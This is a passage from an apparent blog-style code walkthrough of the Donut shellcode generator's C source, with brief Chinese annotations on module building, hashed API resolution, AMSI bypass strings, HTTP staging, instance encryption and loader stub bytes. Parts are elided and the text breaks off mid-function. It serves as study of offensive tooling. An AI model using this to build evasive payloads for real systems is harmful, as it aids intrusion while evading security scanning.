<span class="comment">// 7. save loader and any additional files to disk</span></span><br><span class="line">                err = save_loader(c);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if there was some error, release resources</span></span><br><span class="line">    <span class="keyword">if</span>(err != DONUT_ERROR_OK) &#123;</span><br><span class="line">      DonutDelete(c);</span><br><span class="line">    &#125;</span><br><span class="line">    DPRINT(<span class="string">&quot;Leaving with error :  %&quot;</span> PRId32, err);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">build_module</span><span class="params">(PDONUT_CONFIG c)</span> &#123;</span><br><span class="line">    PDONUT_MODULE mod     = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">uint32_t</span>      mod_len, data_len;</span><br><span class="line">    <span class="type">void</span>          *data;</span><br><span class="line">    <span class="type">int</span>           err = DONUT_ERROR_OK;</span><br><span class="line">    </span><br><span class="line">    DPRINT(<span class="string">&quot;Entering.&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//压缩部分</span></span><br><span class="line">    <span class="comment">// Compress the input file?</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;compress != DONUT_COMPRESS_NONE) &#123;</span><br><span class="line">      err = compress_file(c);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(err != DONUT_ERROR_OK) &#123;</span><br><span class="line">        DPRINT(<span class="string">&quot;compress_file() failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">      &#125;</span><br><span class="line">      DPRINT(<span class="string">&quot;Assigning %&quot;</span>PRIi32 <span class="string">&quot; bytes of %p to data&quot;</span>, fi.zlen, fi.zdata);</span><br><span class="line">      data     = fi.zdata;</span><br><span class="line">      data_len = fi.zlen;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      DPRINT(<span class="string">&quot;Assigning %&quot;</span>PRIi32 <span class="string">&quot; bytes of %p to data&quot;</span>, fi.len, fi.data);</span><br><span class="line">      data     = fi.data;</span><br><span class="line">      data_len = fi.len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Allocate memory for module information and contents of file</span></span><br><span class="line">    mod_len = data_len + <span class="keyword">sizeof</span>(DONUT_MODULE);</span><br><span class="line">    </span><br><span class="line">    DPRINT(<span class="string">&quot;Allocating %&quot;</span> PRIi32 <span class="string">&quot; bytes of memory for DONUT_MODULE&quot;</span>, mod_len);</span><br><span class="line">    mod = <span class="built_in">calloc</span>(mod_len, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Memory not allocated? exit</span></span><br><span class="line">    <span class="keyword">if</span>(mod == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      DPRINT(<span class="string">&quot;calloc() failed&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> DONUT_ERROR_NO_MEMORY;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Set the module info</span></span><br><span class="line">    mod-&gt;type     = fi.type;</span><br><span class="line">    mod-&gt;thread   = c-&gt;thread;</span><br><span class="line">    mod-&gt;compress = c-&gt;compress;</span><br><span class="line">    mod-&gt;unicode  = c-&gt;unicode;</span><br><span class="line">    mod-&gt;zlen     = fi.zlen;</span><br><span class="line">    mod-&gt;len      = fi.len;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//处理.net程序集</span></span><br><span class="line">    <span class="comment">// DotNet assembly?</span></span><br><span class="line">    <span class="keyword">if</span>(mod-&gt;type == DONUT_MODULE_NET_DLL ||</span><br><span class="line">       mod-&gt;type == DONUT_MODULE_NET_EXE)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// If no domain name specified in configuration</span></span><br><span class="line">      <span class="keyword">if</span>(c-&gt;domain[<span class="number">0</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// if entropy is enabled</span></span><br><span class="line">        <span class="keyword">if</span>(c-&gt;entropy != DONUT_ENTROPY_NONE) &#123; </span><br><span class="line">          <span class="comment">// generate a random name</span></span><br><span class="line">          <span class="keyword">if</span>(!gen_random_string(c-&gt;domain, DONUT_DOMAIN_LEN)) &#123;</span><br><span class="line">            DPRINT(<span class="string">&quot;gen_random_string() failed&quot;</span>);</span><br><span class="line">            err = DONUT_ERROR_RANDOM;</span><br><span class="line">            <span class="keyword">goto</span> cleanup;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      DPRINT(<span class="string">&quot;Domain  : %s&quot;</span>, c-&gt;domain[<span class="number">0</span>] == <span class="number">0</span> ? <span class="string">&quot;Default&quot;</span> : c-&gt;domain);</span><br><span class="line">      <span class="keyword">if</span>(c-&gt;domain[<span class="number">0</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Set the domain name in module</span></span><br><span class="line">        <span class="built_in">strncpy</span>(mod-&gt;domain, c-&gt;domain, DONUT_DOMAIN_LEN);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">memset</span>(mod-&gt;domain, <span class="number">0</span>, DONUT_DOMAIN_LEN);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Assembly is DLL? Copy the class and method</span></span><br><span class="line">      <span class="keyword">if</span>(mod-&gt;type == DONUT_MODULE_NET_DLL) &#123;</span><br><span class="line">        DPRINT(<span class="string">&quot;Class   : %s&quot;</span>, c-&gt;cls);</span><br><span class="line">        <span class="built_in">strncpy</span>(mod-&gt;cls, c-&gt;cls, DONUT_MAX_NAME<span class="number">-1</span>);</span><br><span class="line">        </span><br><span class="line">        DPRINT(<span class="string">&quot;Method  : %s&quot;</span>, c-&gt;method);</span><br><span class="line">        <span class="built_in">strncpy</span>(mod-&gt;method, c-&gt;method, DONUT_MAX_NAME<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// If no runtime specified in configuration, use version from assembly</span></span><br><span class="line">      <span class="keyword">if</span>(c-&gt;runtime[<span class="number">0</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">strncpy</span>(c-&gt;runtime, fi.ver, DONUT_MAX_NAME<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      DPRINT(<span class="string">&quot;Runtime : %s&quot;</span>, c-&gt;runtime);</span><br><span class="line">      <span class="built_in">strncpy</span>(mod-&gt;runtime, c-&gt;runtime, DONUT_MAX_NAME<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">    <span class="comment">// Unmanaged DLL? copy function name to module          </span></span><br><span class="line">    <span class="keyword">if</span>(mod-&gt;type == DONUT_MODULE_DLL &amp;&amp; c-&gt;method[<span class="number">0</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">      DPRINT(<span class="string">&quot;DLL function : %s&quot;</span>, c-&gt;method);</span><br><span class="line">      <span class="built_in">strncpy</span>(mod-&gt;method, c-&gt;method, DONUT_MAX_NAME<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="comment">//处理-p参数</span></span><br><span class="line">    <span class="comment">// Parameters specified?</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;args[<span class="number">0</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// If file type is unmanaged EXE</span></span><br><span class="line">      <span class="keyword">if</span>(mod-&gt;type == DONUT_MODULE_EXE) &#123;<span class="comment">//处理.net</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// If entropy is disabled</span></span><br><span class="line">        <span class="keyword">if</span>(c-&gt;entropy == DONUT_ENTROPY_NONE) &#123;<span class="comment">//处理混淆</span></span><br><span class="line">          <span class="comment">// Set to &quot;AAAA&quot;</span></span><br><span class="line">          <span class="built_in">memset</span>(mod-&gt;args, <span class="string">&#x27;A&#x27;</span>, <span class="number">4</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// Generate 4-byte random name</span></span><br><span class="line">          <span class="keyword">if</span>(!gen_random_string(mod-&gt;args, <span class="number">4</span>)) &#123;</span><br><span class="line">            DPRINT(<span class="string">&quot;gen_random_string() failed&quot;</span>);</span><br><span class="line">            err = DONUT_ERROR_RANDOM;</span><br><span class="line">            <span class="keyword">goto</span> cleanup;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Add space</span></span><br><span class="line">        mod-&gt;args[<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// </span></span><br><span class="line">      <span class="comment">// Copy parameters </span></span><br><span class="line">      <span class="built_in">strncat</span>(mod-&gt;args, c-&gt;args, DONUT_MAX_NAME<span class="number">-6</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">    DPRINT(<span class="string">&quot;Copying data to module&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;mod-&gt;data, data, data_len);</span><br><span class="line">    <span class="comment">// update configuration with pointer to module</span></span><br><span class="line">    c-&gt;mod     = mod;</span><br><span class="line">    c-&gt;mod_len = mod_len;</span><br><span class="line">cleanup:</span><br><span class="line">    <span class="comment">// if there was an error, free memory for module</span></span><br><span class="line">    <span class="keyword">if</span>(err != DONUT_ERROR_OK) &#123;</span><br><span class="line">      DPRINT(<span class="string">&quot;Releasing memory due to errors.&quot;</span>);</span><br><span class="line">      <span class="built_in">free</span>(mod);</span><br><span class="line">    &#125;</span><br><span class="line">    DPRINT(<span class="string">&quot;Leaving with error :  %&quot;</span> PRId32, err);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">build_instance</span><span class="params">(PDONUT_CONFIG c)</span> &#123;</span><br><span class="line">    DONUT_CRYPT     inst_key, mod_key;</span><br><span class="line">    PDONUT_INSTANCE inst = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span>             cnt, inst_len;</span><br><span class="line">    <span class="type">uint64_t</span>        dll_hash;</span><br><span class="line">    <span class="type">int</span>             err = DONUT_ERROR_OK;</span><br><span class="line">    </span><br><span class="line">    DPRINT(<span class="string">&quot;Entering.&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Allocate memory for the size of instance based on the type</span></span><br><span class="line">    DPRINT(<span class="string">&quot;Allocating memory for instance&quot;</span>);</span><br><span class="line">    inst_len = <span class="keyword">sizeof</span>(DONUT_INSTANCE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if the module is embedded, add the size of module</span></span><br><span class="line">    <span class="comment">// that will be appended to the end of structure</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;inst_type == DONUT_INSTANCE_EMBED) &#123;</span><br><span class="line">      DPRINT(<span class="string">&quot;The size of module is %&quot;</span> PRIi32 <span class="string">&quot; bytes. &quot;</span> </span><br><span class="line">             <span class="string">&quot;Adding to size of instance.&quot;</span>, c-&gt;mod_len);</span><br><span class="line">      inst_len += c-&gt;mod_len;</span><br><span class="line">    &#125;</span><br><span class="line">    DPRINT(<span class="string">&quot;Total length of instance : %&quot;</span>PRIi32, inst_len);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// allocate zero-initialized memory for instance</span></span><br><span class="line">    inst = (PDONUT_INSTANCE)<span class="built_in">calloc</span>(inst_len, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Memory allocation failed? exit</span></span><br><span class="line">    <span class="keyword">if</span>(inst == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      DPRINT(<span class="string">&quot;Memory allocation failed&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> DONUT_ERROR_NO_MEMORY;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set the length of instance and pointer to it in configuration</span></span><br><span class="line">    c-&gt;inst        = inst;</span><br><span class="line">    ....</span><br><span class="line">    <span class="comment">//参数分配以及生成随机字符拼接</span></span><br><span class="line">    DPRINT(<span class="string">&quot;Generating hashes for API using IV: %&quot;</span> PRIX64, inst-&gt;iv);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//通过hash计算动态获取函数</span></span><br><span class="line">    <span class="keyword">for</span>(cnt=<span class="number">0</span>; api_imports[cnt].module != <span class="literal">NULL</span>; cnt++) &#123;</span><br><span class="line">      <span class="comment">// calculate hash for DLL string</span></span><br><span class="line">      dll_hash = maru(api_imports[cnt].module, inst-&gt;iv);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// calculate hash for API string.</span></span><br><span class="line">      <span class="comment">// xor with DLL hash and store in instance</span></span><br><span class="line">      inst-&gt;api.hash[cnt] = maru(api_imports[cnt].name, inst-&gt;iv) ^ dll_hash;</span><br><span class="line">      </span><br><span class="line">      DPRINT(<span class="string">&quot;Hash for %-15s : %-22s = %016&quot;</span> PRIX64, </span><br><span class="line">        api_imports[cnt].module, </span><br><span class="line">        api_imports[cnt].name,</span><br><span class="line">        inst-&gt;api.hash[cnt]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    DPRINT(<span class="string">&quot;Setting number of API to %&quot;</span> PRIi32, cnt);</span><br><span class="line">    inst-&gt;api_cnt = cnt;</span><br><span class="line">    </span><br><span class="line">    DPRINT(<span class="string">&quot;Setting DLL names to %s&quot;</span>, DLL_NAMES);</span><br><span class="line">    <span class="built_in">strcpy</span>(inst-&gt;dll_names, DLL_NAMES);</span><br><span class="line">        </span><br><span class="line">    <span class="comment">//处理.net vbs特殊文件格式等</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;mod_type == DONUT_MODULE_NET_DLL ||</span><br><span class="line">       c-&gt;mod_type == DONUT_MODULE_NET_EXE)</span><br><span class="line">    .....</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// bypass amsi</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;bypass != DONUT_BYPASS_NONE) &#123;</span><br><span class="line">      DPRINT(<span class="string">&quot;Copying strings required to bypass AMSI&quot;</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="built_in">strcpy</span>(inst-&gt;clr,         <span class="string">&quot;clr&quot;</span>);</span><br><span class="line">      <span class="built_in">strcpy</span>(inst-&gt;amsi,        <span class="string">&quot;amsi&quot;</span>);</span><br><span class="line">      <span class="built_in">strcpy</span>(inst-&gt;amsiInit,    <span class="string">&quot;AmsiInitialize&quot;</span>);</span><br><span class="line">      <span class="built_in">strcpy</span>(inst-&gt;amsiScanBuf, <span class="string">&quot;AmsiScanBuffer&quot;</span>);</span><br><span class="line">      .....</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//处理非托管exe</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;mod_type == DONUT_MODULE_EXE) &#123;</span><br><span class="line">      <span class="comment">// does the user specify parameters for the command line?</span></span><br><span class="line">      <span class="keyword">if</span>(c-&gt;args[<span class="number">0</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        DPRINT(<span class="string">&quot;Copying strings required to replace command line.&quot;</span>);</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// decoy module path</span></span><br><span class="line">    <span class="built_in">strcpy</span>(inst-&gt;decoy, c-&gt;decoy);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if the module will be downloaded</span></span><br><span class="line">    <span class="comment">// set the URL parameter and request verb</span></span><br><span class="line">    <span class="comment">//做混淆和加密</span></span><br><span class="line">    <span class="keyword">if</span>(inst-&gt;type == DONUT_INSTANCE_HTTP) &#123;</span><br><span class="line">      <span class="comment">// if no module name specified</span></span><br><span class="line">      <span class="keyword">if</span>(c-&gt;modname[<span class="number">0</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// if entropy disabled</span></span><br><span class="line">        <span class="keyword">if</span>(c-&gt;entropy == DONUT_ENTROPY_NONE) &#123;</span><br><span class="line">.......</span><br><span class="line">    <span class="comment">// encrypt instance?</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;entropy == DONUT_ENTROPY_DEFAULT) &#123;</span><br><span class="line">      DPRINT(<span class="string">&quot;Encrypting instance&quot;</span>);</span><br><span class="line">      </span><br><span class="line">      inst-&gt;mac = maru(inst-&gt;sig, inst-&gt;iv);</span><br><span class="line">      </span><br><span class="line">      <span class="type">uint8_t</span> *inst_data = (<span class="type">uint8_t</span>*)inst + offsetof(DONUT_INSTANCE, api_cnt);</span><br><span class="line">      </span><br><span class="line">      donut_encrypt(</span><br><span class="line">        inst_key.mk, </span><br><span class="line">        inst_key.ctr, </span><br><span class="line">        inst_data, </span><br><span class="line">        c-&gt;inst_len - offsetof(DONUT_INSTANCE, api_cnt));</span><br><span class="line">    &#125;</span><br><span class="line">cleanup:</span><br><span class="line">    <span class="comment">// error? release memory for everything</span></span><br><span class="line">    <span class="keyword">if</span>(err != DONUT_ERROR_OK) &#123;</span><br><span class="line">      DPRINT(<span class="string">&quot;Releasing memory for module due to errors.&quot;</span>);</span><br><span class="line">      <span class="built_in">free</span>(c-&gt;mod);</span><br><span class="line">    &#125;</span><br><span class="line">    DPRINT(<span class="string">&quot;Leaving with error :  %&quot;</span> PRId32, err);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">build_loader</span><span class="params">(PDONUT_CONFIG c)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> LOADER_EXE_X64_RSP_ALIGN[] = &#123;</span><br><span class="line">        <span class="comment">// push rbp</span></span><br><span class="line">        <span class="number">0x55</span>,</span><br><span class="line">        <span class="comment">// mov rbp, rsp</span></span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xE5</span>,</span><br><span class="line">        <span class="comment">// and rsp, -0x10</span></span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE4</span>, <span class="number">0xF0</span>,</span><br><span class="line">        <span class="comment">// sub rsp, 0x20</span></span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x20</span>,</span><br><span class="line">        <span class="comment">// call $ + 5</span></span><br><span class="line">        <span class="number">0xE8</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">// mov rsp, rbp</span></span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xEC</span>,</span><br><span class="line">        <span class="comment">// pop rbp</span></span><br><span class="line">        <span class="number">0x5D</span>,</span><br><span class="line">        <span class="comment">// ret</span></span><br><span class="line">        <span class="number">0xC3</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *pl;</span><br><span class="line">    <span class="type">uint32_t</span> t;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//文件架构部分</span></span><br><span class="line">    <span class="comment">// target is x86?</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;arch == DONUT_ARCH_X86) &#123;</span><br><span class="line">      c-&gt;pic_len = <span class="keyword">sizeof</span>(LOADER_EXE_X86) + c-&gt;inst_len + <span class="number">32</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> </span><br><span class="line">    <span class="comment">// target is amd64?</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;arch == DONUT_ARCH_X64) &#123;</span><br><span class="line">      c-&gt;pic_len = <span class="keyword">sizeof</span>(LOADER_EXE_X64_RSP_ALIGN) +</span><br><span class="line">                   <span class="keyword">sizeof</span>(LOADER_EXE_X64) + c-&gt;inst_len + <span class="number">32</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> </span><br><span class="line">    <span class="comment">// target can be both x86 and amd64?</span></span><br><span class="line">    <span class="keyword">if</span>(c-&gt;arch == DONUT_ARCH_X84) &#123;</span><br><span class="line">      c-&gt;pic_len = <span class="keyword">sizeof</span>(LOADER_EXE_X86) + </span><br><span class="line">                   <span class="keyword">sizeof</span>(LOADER_EXE_X64_RSP_ALIGN) + </span><br><span class="line">                   <span class="keyword">sizeof</span>(LOADER_EXE_X64) + c-&gt;inst_len + <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//分配shellcode内存</span></span><br><span class="line">    <span class="comment">// allocate memory for shellcode</span></span><br><span class="line">    c-&gt;pic = <span class="built_in">malloc</span>(c-&gt;pic_len);</span><br><span class="line">    <span class="keyword">if</span>(c-&gt;pic == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      DPRINT(<span class="string">&quot;Unable to allocate %&quot;</span> PRId32 <span class="string">&quot; bytes of memory for loader.&quot;</span>, c-&gt;pic_len);</span><br><span class="line">      <span class="keyword">return</span> 